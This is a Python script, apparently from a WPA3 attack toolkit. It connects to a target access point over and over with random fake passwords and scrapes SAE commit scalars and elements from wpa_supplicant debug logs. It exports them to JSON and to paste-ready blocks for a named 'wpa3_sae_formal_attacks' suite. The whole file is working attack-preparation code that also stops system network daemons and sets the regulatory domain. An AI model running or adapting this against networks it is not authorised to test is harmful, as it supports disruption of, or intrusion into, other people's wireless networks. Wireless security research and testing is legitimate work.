#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
WPA3-SAE Parameter Extractor (Direct RAM/Log Parsing) - v2 (2.4 / 5 / 6 GHz)
================================================================================
Bypasses Monitor-Mode/Tx-Capture limitations by directly parsing the internal
cryptographic debug logs (-dd) of wpa_supplicant.

FEATURES:
- Full 2.4 GHz, 5 GHz, and 6 GHz (Wi-Fi 6E / Wi-Fi 7) support
- Automatic SAE Hash-to-Element (H2E / sae_pwe) handling required for 6 GHz
- Strict byte-length validation per SAE group (Groups 19-24)
- Non-blocking I/O using select() for maximum stability
- Exports both ready-to-paste Python dictionaries AND sae_params.json
  (automatically merges with existing bands in sae_params.json)
================================================================================
"""
import os
import sys
import json
import time
import string
import random
import select
import signal
import argparse
import subprocess

# ======================= DEFAULT CONFIGURATION =======================
MANAGED_IFACE     = "wlan0"                   # Normal Wi-Fi interface (Managed Mode)
TARGET_SSID       = "Your_WiFi_Name"
TARGET_BSSID      = "AA:BB:CC:DD:EE:11".lower()
TARGET_BAND       = "2.4GHz"                  # Options: "2.4GHz", "5GHz", "6GHz"
TARGET_CHANNEL    = "1"                       # Channel number in the target band
REGULATORY_DOMAIN = "US"                      # Regulatory domain (e.g., DE, PA, US)
PAIRS_PER_GROUP   = 20
MAX_ATTEMPTS      = 5                         # Skip group after N consecutive failures
JSON_OUTPUT_FILE  = "sae_params.json"         # Output file for "--sae-file" in attack suite
# =====================================================================

SAE_GROUPS = [19, 20, 21, 22, 23, 24]

# Expected hex character lengths: (scalar_bytes * 2, finite_bytes * 2)
SAE_GROUP_HEX_LENGTHS = {
    19: (64, 128),    # 32B scalar, 64B element (ECC P-256)
    20: (96, 192),    # 48B scalar, 96B element (ECC P-384)
    21: (132, 264),   # 66B scalar, 132B element (ECC P-521)
    22: (64, 512),    # 32B scalar, 256B element (MODP 1024)
    23: (64, 768),    # 32B scalar, 384B element (MODP 1536)
    24: (64, 1024),   # 32B scalar, 512B element (MODP 2048)
}


def run_cmd(cmd: list, timeout: int = 5) -> bool:
    """Executes a system command safely without shell injection."""
    try:
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
        return res.returncode == 0
    except Exception:
        return False


def channel_to_freq(channel_str: str, band: str) -> str:
    """
    Converts a Wi-Fi channel number and band (2.4GHz, 5GHz, 6GHz) to its center frequency in MHz.
    Required because channel numbers overlap between 2.4/5 GHz and 6 GHz (Ch 1-233).
    """
    if not channel_str or not str(channel_str).isdigit():
        return ""
    ch = int(channel_str)
    band_norm = band.upper()

    if band_norm == "2.4GHZ":
        if ch == 14:
            return "2484"
        if 1 <= ch <= 13:
            return str(2407 + (ch * 5))
    elif band_norm == "5GHZ":
        if 32 <= ch <= 177:
            return str(5000 + (ch * 5))
    elif band_norm == "6GHZ":
        # IEEE 802.11ax 6 GHz band (5955 - 7115 MHz, channels 1..233)
        if ch == 2:
            return "5935"
        if 1 <= ch <= 233:
            return str(5950 + (ch * 5))

    return ""


def initial_dfs_and_6ghz_prep(iface: str, reg_domain: str):
    """Unlocks regulatory restrictions, stops interfering daemons, and prepares Managed mode."""
    print(f"[*] Preparing interface {iface} and setting regulatory domain ({reg_domain})...")
    run_cmd(["rfkill", "unblock", "all"])
    run_cmd(["systemctl", "stop", "NetworkManager"])
    run_cmd(["systemctl", "stop", "wpa_supplicant"])
    run_cmd(["airmon-ng", "check", "kill"])
    run_cmd(["killall", "-9", "wpa_supplicant"])

    ctrl_path = f"/var/run/wpa_supplicant/{iface}"
    if os.path.exists(ctrl_path):
        try:
            os.remove(ctrl_path)
        except OSError:
            pass

    if reg_domain:
        run_cmd(["iw", "reg", "set", reg_domain])
        time.sleep(0.3)

    # Cycle Monitor -> Managed to reset firmware DFS / 6GHz state
    run_cmd(["ip", "link", "set", iface, "down"])
    time.sleep(0.3)
    run_cmd(["iw", "dev", iface, "set", "type", "monitor"])
    time.sleep(0.2)
    run_cmd(["ip", "link", "set", iface, "up"])
    time.sleep(0.3)

    run_cmd(["ip", "link", "set", iface, "down"])
    time.sleep(0.3)
    run_cmd(["iw", "dev", iface, "set", "type", "managed"])
    time.sleep(0.2)
    run_cmd(["ip", "link", "set", iface, "up"])
    time.sleep(0.5)


def clean_wpa_state(iface: str):
    """Fast cleanup between attempts. Clears driver & wpa_supplicant state."""
    run_cmd(["killall", "-9", "wpa_supplicant"])
    ctrl_path = f"/var/run/wpa_supplicant/{iface}"
    if os.path.exists(ctrl_path):
        try:
            os.remove(ctrl_path)
        except OSError:
            pass
    run_cmd(["ip", "link", "set", iface, "down"])
    time.sleep(0.1)
    run_cmd(["ip", "link", "set", iface, "up"])
    time.sleep(0.2)


def pad_hex(hex_str: str, target_len: int) -> str:
    """Pads leading zeros if wpa_supplicant strips leading zero bytes in bignum dumps."""
    if len(hex_str) < target_len and len(hex_str) % 2 == 0:
        return hex_str.zfill(target_len)
    return hex_str


def save_to_json(filepath: str, band: str, collected: dict):
    """Saves/merges extracted SAE parameters into sae_params.json for wpa3_sae_formal_attacks_v2.py."""
    data = {}
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}

    if band not in data:
        data[band] = {"scalars": {}, "finites": {}}
    if "scalars" not in data[band]:
        data[band]["scalars"] = {}
    if "finites" not in data[band]:
        data[band]["finites"] = {}

    for gid, vals in collected.items():
        if vals["scalars"] and vals["finites"]:
            data[band]["scalars"][str(gid)] = vals["scalars"]
            data[band]["finites"][str(gid)] = vals["finites"]

    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Saved/Updated JSON parameters in '{filepath}' under band '{band}'.")
    except Exception as e:
        print(f"[!] Failed to write JSON file '{filepath}': {e}")


def main():
    parser = argparse.ArgumentParser(description="WPA3-SAE Parameter Extractor (2.4GHz / 5GHz / 6GHz)")
    parser.add_argument("--iface", type=str, default=MANAGED_IFACE, help="Managed Wi-Fi interface (e.g. wlan0)")
    parser.add_argument("--ssid", type=str, default=TARGET_SSID, help="Target AP SSID")
    parser.add_argument("--bssid", type=str, default=TARGET_BSSID, help="Target AP BSSID")
    parser.add_argument("--band", type=str, choices=["2.4GHz", "5GHz", "6GHz"], default=TARGET_BAND, help="Target band")
    parser.add_argument("--channel", type=str, default=TARGET_CHANNEL, help="Target channel number")
    parser.add_argument("--reg", type=str, default=REGULATORY_DOMAIN, help="Regulatory domain (e.g. DE, US, PA)")
    parser.add_argument("--pairs", type=int, default=PAIRS_PER_GROUP, help="Number of pairs to extract per group")
    parser.add_argument("--json-out", type=str, default=JSON_OUTPUT_FILE, help="Output JSON file path")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("[!] Root privileges required (sudo).")

    iface = args.iface
    ssid = args.ssid
    bssid = args.bssid.lower()
    band = args.band
    channel = args.channel
    pairs_goal = args.pairs

    target_freq = channel_to_freq(channel, band)
    if not target_freq:
        print(f"[!] Warning: Could not map Channel {channel} on {band} to MHz. Scanning all frequencies...")
    freq_line = f"    freq_list={target_freq}" if target_freq else ""

    # On 6 GHz, IEEE 802.11ax mandates Hash-to-Element (H2E, sae_pwe=1 or 2).
    # Using sae_pwe=1 for 6GHz and sae_pwe=2 (both H&P and H2E) for 2.4/5GHz ensures compatibility.
    sae_pwe_val = 1 if band == "6GHz" else 2

    print("[*] WPA3-SAE Extractor v2 (2.4 / 5 / 6 GHz Support)")
    print(f"[*] Target: {ssid} ({bssid}) | Band: {band} | Channel: {channel} ({target_freq or 'Auto'} MHz)")
    print(f"[*] SAE PWE Mode: {sae_pwe_val} ({'H2E Mandatory (6GHz)' if sae_pwe_val == 1 else 'H&P + H2E'})")
    print(f"[*] Goal: {pairs_goal} pairs per supported group | JSON Output: {args.json_out}")

    initial_dfs_and_6ghz_prep(iface, args.reg)

    collected = {g: {"scalars": [], "finites": []} for g in SAE_GROUPS}
    conf_path = "/tmp/temp_extract.conf"

    try:
        for group_id in SAE_GROUPS:
            print(f"\n[*] ==========================================")
            print(f"[*] Extracting Group {group_id} ({band})...")
            print(f"[*] ==========================================")

            exp_s_len, exp_f_len = SAE_GROUP_HEX_LENGTHS[group_id]
            attempt = 1
            current_timeout = 18 if band == "6GHz" else 15

            while len(collected[group_id]["scalars"]) < pairs_goal:
                if attempt > MAX_ATTEMPTS:
                    print(f"[-] Max attempts reached. Target AP likely does NOT support Group {group_id}. Skipping...")
                    break

                password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                count = len(collected[group_id]["scalars"])
                print(
                    f"[*] Attempt {attempt}/{MAX_ATTEMPTS} -> "
                    f"Collected {count}/{pairs_goal} pairs (Fake PW: {password})"
                )

                conf_content = f"""ctrl_interface=/var/run/wpa_supplicant
sae_groups={group_id}
sae_pwe={sae_pwe_val}
network={{
    ssid="{ssid}"
    scan_ssid=1
    bssid={bssid}
    sae_password="{password}"
    key_mgmt=SAE
    proto=RSN
    ieee80211w=2
{freq_line}
}}
"""
                with open(conf_path, "w", encoding="utf-8") as f:
                    f.write(conf_content)

                cmd = ["wpa_supplicant", "-i", iface, "-c", conf_path, "-dd"]
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

                scalar, elem_x, elem_y, elem_ffc = "", "", "", ""
                found_in_this_run = False
                start_time = time.time()

                try:
                    while time.time() - start_time <= current_timeout:
                        reads, _, _ = select.select([proc.stdout], [], [], 0.4)
                        if not reads:
                            continue

                        line = proc.stdout.readline()
                        if not line:
                            break

                        if "status_code=" in line and "status_code=0" not in line and not scalar:
                            print("      [!] AP rejected Auth before commit (Unsupported Group?). Skipping wait.")
                            break
                        if "SME: Authentication timeout" in line or "CTRL-EVENT-ASSOC-REJECT" in line:
                            print("      [!] AP Auth timeout/reject. Skipping wait.")
                            break

                        if "SAE: own commit-scalar - hexdump" in line and "):" in line:
                            raw_s = line.split("):")[1].strip().replace(" ", "")
                            if "[REMOVED]" not in raw_s:
                                scalar = pad_hex(raw_s, exp_s_len)
                        elif "SAE: own commit-element(x) - hexdump" in line and "):" in line:
                            raw_x = line.split("):")[1].strip().replace(" ", "")
                            if "[REMOVED]" not in raw_x:
                                elem_x = pad_hex(raw_x, exp_f_len // 2)
                        elif "SAE: own commit-element(y) - hexdump" in line and "):" in line:
                            raw_y = line.split("):")[1].strip().replace(" ", "")
                            if "[REMOVED]" not in raw_y:
                                elem_y = pad_hex(raw_y, exp_f_len // 2)
                        elif "SAE: own commit-element - hexdump" in line and "):" in line:
                            raw_ffc = line.split("):")[1].strip().replace(" ", "")
                            if "[REMOVED]" not in raw_ffc:
                                elem_ffc = pad_hex(raw_ffc, exp_f_len)

                        if scalar and ((elem_x and elem_y) or elem_ffc):
                            finite = (elem_x + elem_y) if (elem_x and elem_y) else elem_ffc
                            if len(scalar) == exp_s_len and len(finite) == exp_f_len:
                                if scalar not in collected[group_id]["scalars"]:
                                    collected[group_id]["scalars"].append(scalar)
                                    collected[group_id]["finites"].append(finite)
                                    found_in_this_run = True
                                    current_timeout = 8
                                    print(
                                        f"[+] Fast-Extract Success: Pair "
                                        f"{len(collected[group_id]['scalars'])}/{pairs_goal} extracted!"
                                    )
                            else:
                                print(
                                    f"      [!] Length mismatch for Group {group_id}: "
                                    f"S={len(scalar)} (exp {exp_s_len}), F={len(finite)} (exp {exp_f_len})"
                                )
                            break
                finally:
                    if proc.poll() is None:
                        proc.terminate()
                        try:
                            proc.wait(timeout=2)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                    clean_wpa_state(iface)

                if found_in_this_run:
                    attempt = 1
                else:
                    attempt += 1

            print(f"\n[*] Group {group_id} finished ({len(collected[group_id]['scalars'])} pairs).")

        # Save to JSON for direct use with --sae-file
        save_to_json(args.json_out, band, collected)

        # Print ready-to-paste Python dictionary matching wpa3_sae_formal_attacks_v2.py
        band_var = band.upper().replace(".", "_")
        print("\n" + "=" * 80)
        print(f"# Copy-Paste block for wpa3_sae_formal_attacks_v2.py ({band}):")
        print(f"SAE_SCALARS_{band_var} = {{")
        for gid in SAE_GROUPS:
            print(f"    {gid}: [")
            for s in collected[gid]["scalars"]:
                print(f"        '{s}',")
            print("    ],")
        print("}")
        print(f"SAE_FINITES_{band_var} = {{")
        for gid in SAE_GROUPS:
            print(f"    {gid}: [")
            for f in collected[gid]["finites"]:
                print(f"        '{f}',")
            print("    ],")
        print("}")
        print("=" * 80 + "\n")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Saving partial results...")
        save_to_json(args.json_out, band, collected)
    finally:
        if os.path.exists(conf_path):
            try:
                os.remove(conf_path)
            except OSError:
                pass
        print("[*] Restarting NetworkManager...")
        run_cmd(["systemctl", "start", "NetworkManager"])


if __name__ == "__main__":
    main()
